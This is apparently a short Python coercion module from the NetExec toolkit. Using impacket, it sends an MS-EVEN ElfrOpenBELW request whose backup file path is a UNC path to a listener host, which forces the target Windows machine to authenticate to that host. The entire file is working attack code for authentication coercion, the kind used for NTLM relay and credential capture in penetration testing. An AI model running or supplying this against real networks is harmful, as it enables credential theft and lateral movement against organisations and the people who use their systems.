from impacket.dcerpc.v5.even import ElfrOpenBELW
from impacket.dcerpc.v5.dtypes import NULL


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


def request(dce, target, listener):
    request = ElfrOpenBELW()
    request["UNCServerName"] = NULL  # '%s\x00' % listener
    request["BackupFileName"] = f"\\??\\UNC\\{listener}\\abcdefgh\\aa"
    request["MajorVersion"] = 1
    request["MinorVersion"] = 1
    dce.request(request)